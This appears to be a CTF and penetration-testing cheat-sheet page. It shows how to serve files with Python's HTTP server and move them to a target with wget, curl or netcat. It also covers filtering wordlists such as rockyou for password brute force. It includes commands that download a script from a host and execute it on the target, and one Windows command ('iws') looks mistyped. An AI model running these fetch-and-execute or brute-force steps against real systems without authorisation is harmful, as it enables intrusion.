# Exploitation

<hr class="sep-both">

## Transfer files between two machines🛅

You will often have to send scripts to the target, or download files from the target.

<div class="row row-cols-md-2"><div>

**The most used: Python HTTP Server** 🐍

<i class="small">On the host where the file is:</i>

```bash
$ ls
file.sh file.ps1
$ python -m http.server port # port > 1023
$ sudo python -m http.server port # port <= 1023
```

<i class="small">On the client that need the file:</i>

```bash
# Linux
$ wget HOST_IP:port/script.sh -o /tmp/script.sh
$ chmod +x /tmp/script.sh;
$ /tmp/script.sh
# Windows
PS> wget HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
PS> . $Env:TMP/script.ps1; script
```
</div><div>

Of course, it doesn't work in every case.

* You may use copy-paste if available ✂️
* You may try with `python2`, and `python3`
* You may have to use `curl` or `iws` (Windows-only)

```bash
$ curl HOST_IP:port/script.sh -o /tmp/script.sh
PS> curl HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
PS> iws HOST_IP:port/script.ps1 -o $Env:TMP/script.ps1
```

* You can use netcat 🌉

```bash
# host
$ nc CLIENT_IP port < file.sh
# client
$ nc -lvp port > file.sh
```

* You may use FTP/SCP/NFS... if applicable
</div></div>

<hr class="sl">

## 📃 Wordlists 📃

<div class="row row-cols-md-2 mt-3"><div>

There are two packages that are providing a lot of wordlists. Install, then use either command `wordlists` or `seclists` to move to the location where the wordlists are stored, and get the path of every wordlist.

* package seclists | [GitHub](https://github.com/danielmiessler/SecLists) (43k ⭐)
* package wordlists | [GitHub](https://github.com/drtychai/wordlists) (0.1k ⭐)

> **CTF are usually using `/usr/share/wordlists/rockyou.txt`** when there is a password to crack. If it's not inside, then it's likely that you're not supposed to use brute force.

### ➡️ Improving efficiency

As a "hacker", if there is a policy of "at least n characters/up to $m$ characters", then it would be very wise to filter shorter/longer values from your wordlists. For instance, with `rockyou.txt`

* `{n}`: only keep values having exactly $n$ characters
* `{n,}`: only keep values having more ($\ge$) than $n$ characters
* `{n,m}`: only keep values having between $[n,m]$ characters
* `{,m}`: only keep values having less ($\le$) than $m$ characters

```bash
# only keep 4 letters passwords
$ egrep '^.{4}$' /usr/share/wordlists/rockyou.txt > /tmp/4rock.lst
# which is the same as
$ grep '^....$' /usr/share/wordlists/rockyou.txt > /tmp/4rock.lst
```

As a reminder, you can also merge wordlists

```bash
$ cat wordlist1 wordlist2 wordlist3 > wordlist123
```
</div><div>

### ➡️ generate simple wordlists

There may be a case in which you want a wordlist such as numbers from 0 to 99, or every letter from A to Z. In both cases, I'm using [bash braces expansion](/operating-systems/linux/bash/index.md#braces-expansion) to generate the wordlist like this

```bash
$ echo {A..Z} | tr ' ' '\n' > AZ.lst
$ echo {0..99} | tr ' ' '\n' > 0_to_99.lst
$ echo user{0..9} | tr ' ' '\n' > user_0_to_99.lst
$ echo {admin,adm,user} | tr ' ' '\n' > simple_list.lst
```

### ➡️ package wordlist

<p class="mt-4">Passwords</p>

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/wordlists/dirb/others/best1050.txt
/usr/share/wordlists/dirb/others/best110.txt
/usr/share/wordlists/dirb/others/best15.txt
```

### ➡️ package seclists 📌

<p class="mt-4">

[Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
</p>

```
$ ls /usr/share/seclists/Passwords/
2020-200_most_used_passwords.txt
darkc0de.txt
darkweb2017-top10000.txt
$ ls /usr/share/seclists/Passwords/Common-Credentials
10k-most-common.txt
10-million-password-list-top-1000000.txt
$ ls /usr/share/seclists/Usernames/
xato-net-10-million-usernames.txt
```

[Usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames)

```
$ ls /usr/share/seclists/Usernames/
xato-net-10-million-usernames.txt
```
</div></div>